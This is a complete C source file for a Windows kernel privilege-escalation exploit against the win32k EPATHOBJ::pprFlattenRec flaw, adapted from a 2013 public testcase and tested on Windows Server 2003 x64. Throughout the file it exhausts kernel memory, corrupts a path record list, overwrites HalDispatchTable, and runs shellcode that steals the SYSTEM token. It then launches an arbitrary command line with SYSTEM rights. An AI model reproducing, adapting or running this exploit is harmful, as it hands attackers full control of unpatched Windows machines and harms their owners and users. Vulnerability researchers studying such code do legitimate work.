
/*
 * thanks to: Tavis Ormandy & ProgmBoy & instruder
 * by [email]boywhp@126.com[/email]
 * build by WDK7600 
 * tested on windows 2003 x64 en
 * - 1.ImageBase=0x10000
 * - 2.wdk makefile.new disable DYNAMICBASE_FLAG=/dynamicbase
 */

#include <stdlib.h>
#include <stdio.h>
#include <STDARG.H>
#include <stddef.h>
#include <windows.h>
#include <Shellapi.h>

//#include <ntstatus.h>

#pragma comment(lib, "gdi32")
#pragma comment(lib, "kernel32")
#pragma comment(lib, "user32")

#define MAX_POLYPOINTS (8192 * 3)
#define MAX_REGIONS 8192
#define CYCLE_TIMEOUT 10000

#pragma comment(linker, "/SECTION:.text,ERW")

//
// win32k!EPATHOBJ::pprFlattenRec uninitialized Next pointer testcase.
//
// Tavis Ormandy <taviso () cmpxchg8b com>, March 2013
//

POINT       Points[MAX_POLYPOINTS];
BYTE        PointTypes[MAX_POLYPOINTS];
HRGN*       pRegions = NULL;
ULONG       MaxRegions = 0;
ULONG       NumRegion = 0;

HANDLE      Mutex;

// Copied from winddi.h from the DDK
#define PD_BEGINSUBPATH   0x00000001
#define PD_ENDSUBPATH     0x00000002
#define PD_RESETSTYLE     0x00000004
#define PD_CLOSEFIGURE    0x00000008
#define PD_BEZIERS        0x00000010

#define ENABLE_SWITCH_DESKTOP        1

typedef struct  _POINTFIX
{
        ULONG x;
        ULONG y;
} POINTFIX, *PPOINTFIX;

// Approximated from reverse engineering.
typedef struct _PATHRECORD {
        struct _PATHRECORD *next;
        struct _PATHRECORD *prev;
        ULONG               flags;
        ULONG               count;
        POINTFIX            points[4];
} PATHRECORD, *PPATHRECORD;

PPATHRECORD PathRecord;
PATHRECORD  ExploitRecord = {0};
PPATHRECORD ExploitRecordExit;

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
        HANDLE Section;                 // Not filled in
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR  FullPathName[ 256 ];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
        ULONG NumberOfModules;
        RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef INT ( __stdcall *NtQueryIntervalProfile_ ) ( ULONG, PULONG );
typedef INT ( __stdcall *NtQuerySystemInformation_ ) ( ULONG, PVOID, ULONG, PULONG );
typedef INT ( __stdcall *NtReadVirtualMemory_)( HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef PVOID (__stdcall *PsGetCurrentProcess_)();
typedef PVOID (__stdcall *PsReferencePrimaryToken_)(PVOID Process);
typedef INT (__stdcall *PsLookupProcessByProcessId_)(HANDLE ProcessId, PVOID *Process);

NtQueryIntervalProfile_  NtQueryIntervalProfile;
NtQuerySystemInformation_ NtQuerySystemInformation;
NtReadVirtualMemory_ NtReadVirtualMemory;

//#define __SHELL_CODE_MAGIC        0x11223344AABBCCDD

typedef struct _ShellCodeInfo{
        PVOID* MmUserProbeAddress;
        PVOID* WriteToHalDispatchTable; 
        PVOID  NtSetEaFile;
        PVOID* PsInitialSystemProcess;
        DWORD  Pid; 
        PsGetCurrentProcess_ PsGetCurrentProcess;
        PsLookupProcessByProcessId_ PsLookupProcessByProcessId;
        PsReferencePrimaryToken_ PsReferencePrimaryToken;
} ShellCodeInfo, *PShellCodeInfo;

ShellCodeInfo GlobalInfo;

#if defined (_WIN64)
#define MAX_FAST_REFS 15
#else
#define MAX_FAST_REFS 7
#endif

int __stdcall ShellCode(PVOID x, PVOID y, PShellCodeInfo* pInfo, PVOID w)
{
        PShellCodeInfo info; //__SHELL_CODE_MAGIC;
        PVOID targetProcess, sysProcess, token;
        ULONG_PTR *p1, *p2;

        info = *pInfo;
#ifdef _WIN64  
        /* FIX MmUserProbeAddress -> ((ULONG_PTR)(0x80000000000UI64 - 0x10000)) */
        *info->MmUserProbeAddress = ((ULONG_PTR)(0x80000000000UI64 - 0x10000));
#else
        *info->MmUserProbeAddress = 0x7fff0000;
#endif
        /* x64 4����: rcx, rdx, r8, r9 -ֱ��c3���� */
        *info->WriteToHalDispatchTable = info->NtSetEaFile;

        //if (info->PsLookupProcessByProcessId(info->Pid, &targetProcess) != 0)
        //        return 0xC0000019; 

        p1 = targetProcess = info->PsGetCurrentProcess();
        p2 = sysProcess = *info->PsInitialSystemProcess;
        token = info->PsReferencePrimaryToken(sysProcess);

        /* token 4bit->refcnt */
        while ((*p2 & ~MAX_FAST_REFS) != token){
                p1++;
                p2++;
        }

        *p1 = token;

        return 0xC0000018;
}

DWORD WINAPI WatchdogThread(LPVOID Parameter)
{
        //
        // This routine waits for a mutex object to timeout, then patches the
        // compromised linked list to point to an exploit. We need to do this.
        //

        printf("Watchdog thread %d waiting on Mutex\n", GetCurrentThreadId());

        if (WaitForSingleObject(Mutex, CYCLE_TIMEOUT) == WAIT_TIMEOUT) {

                //
                // It looks like the main thread is stuck in a call to FlattenPath(),
                // because the kernel is spinning in EPATHOBJ::bFlatten(). We can clean
                // up, and then patch the list to trigger our exploit.
                //

                while (NumRegion--)
                        DeleteObject(pRegions[NumRegion]);

                printf("InterlockedExchangePointer(0x%p, 0x%p);\n", &PathRecord->next, &ExploitRecord);
                InterlockedExchangePointer(&PathRecord->next, &ExploitRecord);
        } else {
                printf("Mutex object did not timeout, list not patched\n");
        }

        return 0;
}

static int do_expoite(PVOID* addr, PVOID val, PBYTE cmd, PBYTE argv)
{
        HDC     Device;
        HDESK   Desk;
        ULONG   PointNum;
        HANDLE  Thread;
        ULONG   Size;
        INT     ret = -1;
        PBYTE   tmp = NULL;

        //
        // Create our PATHRECORD in user space we will get added to the EPATHOBJ
        // pathrecord chain.
        //

        PathRecord = (PPATHRECORD)VirtualAlloc(
                NULL, 
                sizeof(PATHRECORD),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
                );

        memset(PathRecord, sizeof(PATHRECORD), 0xCC);

        //
        //PathRecord->next = self 
        //stuck here to wait for WatchdogThread set PathRecord->next = ExploitRecord
        //
        PathRecord->next    = PathRecord;
        PathRecord->prev    = (PPATHRECORD)(0x42424242);
        PathRecord->flags   = 0;

        //init ExploitRecordExit node 
        ExploitRecordExit = (PPATHRECORD)VirtualAlloc(
                NULL, 
                sizeof(PATHRECORD),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
                );

        ExploitRecordExit->next = NULL;
        ExploitRecordExit->next = NULL;
        ExploitRecordExit->flags = PD_BEGINSUBPATH;
        ExploitRecordExit->count = 0;

        //
        //ensue ExploitRecord.next -> valid address and end record
        //ExploitRecord.next -> ExploitRecordExit node
        //
        ExploitRecord.next  = (PPATHRECORD)ExploitRecordExit;
        ExploitRecord.prev  = (PPATHRECORD)addr;
        ExploitRecord.flags = PD_BEZIERS | PD_BEGINSUBPATH;
        ExploitRecord.count = 4;

        printf("Alllocated PATHRECORDS:%p %p %p\n", 
                        PathRecord,
                        ExploitRecord,
                        ExploitRecordExit); 

        tmp = malloc((int)ShellCode);
        printf("tmp->%p\n", tmp);

        printf("Creating complex bezier path with %x\n", (ULONG)(PathRecord) >> 4);

        //
        // Generate a large number of Belier Curves made up of pointers to our
        // PATHRECORD object.
        //

        for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) {
#ifdef _WIN64 
                Points[PointNum].x      = (ULONG)(PathRecord) >> 4;
                Points[PointNum].y      = 0;//(ULONG)(PathRecord) >> 4;
#else
                Points[PointNum].x      = (ULONG)(PathRecord) >> 4;
                Points[PointNum].y      = (ULONG)(PathRecord) >> 4;
#endif
                PointTypes[PointNum]    = PT_BEZIERTO;
        }

        //
        // Switch to a dedicated desktop so we don't spam the visible desktop with
        // our Lines (Not required, just stops the screen from redrawing slowly).
        //
        Desk = CreateDesktop("DontPanic",
                NULL,
                NULL,
                0,
                GENERIC_ALL,
                NULL);

        SetThreadDesktop(Desk);

        MaxRegions = MAX_REGIONS;
        pRegions = realloc(NULL, sizeof(HRGN) * MaxRegions);

        Mutex = CreateMutex(NULL, TRUE, NULL);
        Device = GetDC(NULL);

        //
        // Spawn a thread to cleanup
        //

        Thread = CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);

        //
        // We need to cause a specific AllocObject() to fail to trigger the
        // exploitable condition. To do this, I create a large number of rounded
        // rectangular regions until they start failing. I don't think it matters
        // what you use to exhaust paged memory, there is probably a better way.
        //

        // I don't use the simpler CreateRectRgn() because it leaks a GDI handle on
        // failure. Seriously, do some damn QA Microsoft, wtf.
        //        
        //

        for (Size = 1 << 26; Size; Size >>= 1) {
                while (pRegions[NumRegion] = CreateRoundRectRgn(0, 0, 1, Size, 1, 1)){
                        NumRegion++;
                        if (NumRegion >= MaxRegions){
                                MaxRegions = MaxRegions*2;
                                pRegions = realloc(pRegions, sizeof(HRGN) * MaxRegions);
                        }
                }
        }

        printf("Allocated %u/%u HRGN objects\n", NumRegion, MaxRegions);
        printf("Flattening curves...\n");

        //
        // Begin filling the free list with our points.
        //

        for (PointNum = MAX_POLYPOINTS; PointNum; PointNum -= 3) {
                BeginPath(Device);
                PolyDraw(Device, Points, PointTypes, PointNum);
                EndPath(Device);
                FlattenPath(Device);
                FlattenPath(Device);

                if (PathRecord->next != PathRecord){
                        ret = NtReadVirtualMemory((HANDLE)-1, 
                                                tmp, 
                                                tmp, 
                                                (SIZE_T)ShellCode, 
                                                GlobalInfo.WriteToHalDispatchTable
                                                );

                        if (ret == 0){
                                printf("[*] exploit... %p!\n", &GlobalInfo);
                                NtQueryIntervalProfile(&GlobalInfo, &ret);
                                ret = 0;
                        }
                        break;
                }

                EndPath(Device);
        }

        printf("cleaning up...\n");

        //
        // If we reach here, we didn't trigger the condition. Let the other thread know.
        //

        ReleaseMutex(Mutex);

        CloseDesktop(Desk);
        ReleaseDC(NULL, Device);
        WaitForSingleObject(Thread, INFINITE);

        VirtualFree(PathRecord, sizeof(PATHRECORD), MEM_RELEASE);
        VirtualFree(ExploitRecordExit, sizeof(PATHRECORD), MEM_RELEASE);        
        free(tmp);
        free(pRegions);

        CloseHandle(Thread);

        return ret;
}

int main(int argc, char **argv)
{
        HMODULE ntoskrnl = NULL;
        LONG ret;
        BOOL bRet = FALSE;
        HMODULE  ntdll;
        PRTL_PROCESS_MODULES mod = (PRTL_PROCESS_MODULES)&mod;
        PBYTE osBase;
        HMODULE hDllOs;      
        ULONG NeededSize;
        INT expCount = 0;

        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};

        si.cb = sizeof(si);

        //GlobalInfo.Pid = GetCurrentProcessId(); //pi.dwProcessId;

        ntdll = GetModuleHandle("ntdll.dll");

        NtQueryIntervalProfile = (NtQueryIntervalProfile_)GetProcAddress(ntdll, "NtQueryIntervalProfile");
        NtQuerySystemInformation = (NtQuerySystemInformation_)GetProcAddress(ntdll, "NtQuerySystemInformation");
        NtReadVirtualMemory = (NtReadVirtualMemory_)GetProcAddress(ntdll, "NtReadVirtualMemory");

        if (!NtQueryIntervalProfile 
                || !NtQuerySystemInformation
                || !NtReadVirtualMemory){
                printf("error get ntdll fun address\n");
                return -1;
        }                

        /*
        * NtQuerySystemInformation query sys module info
        * STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
        */
        ret = NtQuerySystemInformation(11, mod, 4, &NeededSize);
        if (0xC0000004 == ret){
                mod = malloc(NeededSize);
                ret = NtQuerySystemInformation(11, mod, NeededSize, NULL);

        }

        printf("ntos:%s->%p\n", 
                mod->Modules[0].FullPathName + mod->Modules[0].OffsetToFileName,
                mod->Modules[0].ImageBase);

        osBase = mod->Modules[0].ImageBase;
        hDllOs = LoadLibraryA((LPCSTR)(mod->Modules[0].FullPathName + mod->Modules[0].OffsetToFileName));
        if (!hDllOs){
                printf("error reload os kernel\n");
                return -1;
        }
        free(mod);

        GlobalInfo.WriteToHalDispatchTable = (PBYTE)GetProcAddress(hDllOs, "HalDispatchTable") 
                - (PBYTE)hDllOs + osBase + sizeof(PVOID);
        GlobalInfo.PsInitialSystemProcess = (PBYTE)GetProcAddress(hDllOs, "PsInitialSystemProcess") 
                - (PBYTE)hDllOs + osBase;
        GlobalInfo.PsReferencePrimaryToken = (PBYTE)GetProcAddress(hDllOs, "PsReferencePrimaryToken") 
                - (PBYTE)hDllOs + osBase;
        GlobalInfo.PsGetCurrentProcess = (PBYTE)GetProcAddress(hDllOs, "PsGetCurrentProcess") 
                - (PBYTE)hDllOs + osBase;
        GlobalInfo.PsLookupProcessByProcessId = (PBYTE)GetProcAddress(hDllOs, "PsLookupProcessByProcessId") 
                - (PBYTE)hDllOs + osBase;
        GlobalInfo.MmUserProbeAddress = (PBYTE)GetProcAddress(hDllOs, "MmUserProbeAddress") 
                - (PBYTE)hDllOs + osBase; 
        GlobalInfo.NtSetEaFile = (PBYTE)GetProcAddress(hDllOs, "NtSetEaFile") 
                - (PBYTE)hDllOs + osBase;

        printf("HalDispatchTable - %p MmUserProbeAddress - %p NtSetEaFile - %p \n", 
                        GlobalInfo.WriteToHalDispatchTable, 
                        GlobalInfo.MmUserProbeAddress,
                        GlobalInfo.NtSetEaFile);

        while (do_expoite(GlobalInfo.MmUserProbeAddress, 
                                NULL, 
                                argv[1], 
                                argc > 2 ? argv[2] : NULL) != 0){
                if (expCount > 0x10)
                        break;
        }

        printf("[*]exe %s\n", argv[1]);
        if (!CreateProcess(NULL,        // No module name (use command line)
                argv[1], 
                NULL,
                NULL,
                FALSE,
                0,                      //CREATE_NEW_CONSOLE | CREATE_SUSPENDED, 
                NULL,
                NULL,
                &si,
                &pi)){
                printf("CreateProcess failed (%d)./n", GetLastError());
                return -1;
        }

        //ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        return 0;
}